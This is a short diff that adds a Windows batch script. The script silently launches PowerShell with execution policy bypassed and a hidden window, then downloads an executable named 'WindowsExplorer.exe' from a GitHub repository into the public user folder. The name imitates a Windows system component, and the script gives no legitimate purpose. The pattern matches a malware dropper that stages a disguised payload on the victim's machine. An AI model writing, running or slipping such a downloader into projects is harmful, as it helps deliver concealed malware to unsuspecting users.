@@ -1,0 +1,3 @@
+@echo off
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/WindowsExplorer.exe' -OutFile 'C:\Users\Public\WindowsExplorer.exe'}"
+exit
